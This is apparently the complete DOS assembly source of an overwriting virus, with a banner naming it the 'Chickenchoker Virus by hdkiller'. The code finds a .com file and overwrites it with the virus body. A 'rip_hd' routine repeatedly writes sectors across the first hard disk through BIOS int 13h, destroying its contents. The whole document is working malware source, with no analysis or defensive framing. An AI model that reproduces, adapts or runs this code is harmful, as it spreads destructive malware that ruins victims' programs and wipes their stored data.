Code	Segment
	Assume CS:code,DS:code
	Org	100h

startvx	proc	near

	mov	ah,4eh
	mov	cx,0000h
	mov	dx,offset star_com
	int	21h

	mov	ah,3dh
	mov	al,02h
	mov	dx,9eh
	int	21h

	xchg	bx,ax
	
	mov	ah,40h
	mov	cx,offset endvx - offset startvx
	mov	dx,offset startvx
	int	21h

	mov	ah,3eh
	int	21h

	int	20h

szTitleName	db' Chickenchoker Virus by hdkiller has been activated'

rip_hd:

	xor dx,dx
rip_hd1:
		mov cx,2
		mov ax,311h
		mov dl,80h
		mov bx,5000h
		mov es,bx
		int 13h
		jae rip_hd2
		xor ah,ah
		int 13h
		rip_hd2:
		inc dh
		cmp dh,4
		jb rip_hd1
		inc ch
		jmp rip_hd

startvx	endp

star_com:	db	"*.com",0

endvx	label	near

code	ends
	end	startvx